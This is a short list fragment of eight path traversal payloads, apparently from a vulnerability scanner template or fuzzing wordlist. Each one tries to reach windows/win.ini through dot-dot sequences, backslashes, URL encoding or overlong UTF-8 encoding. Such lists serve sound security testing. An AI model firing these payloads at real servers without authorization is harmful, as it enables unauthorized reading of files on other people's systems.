        - '/..../..../..../..../..../..../..../..../..../windows/win.ini'
        - '/....\....\....\....\....\....\....\....\....\windows\win.ini'
        - '\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini'
        - '/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini'
        - '..%2f..%2f..%2f..%2fwindows/win.ini'
        - '..%2f..%2f..%2f..%2f..%2fwindows/win.ini'
        - '..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini'
        - '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
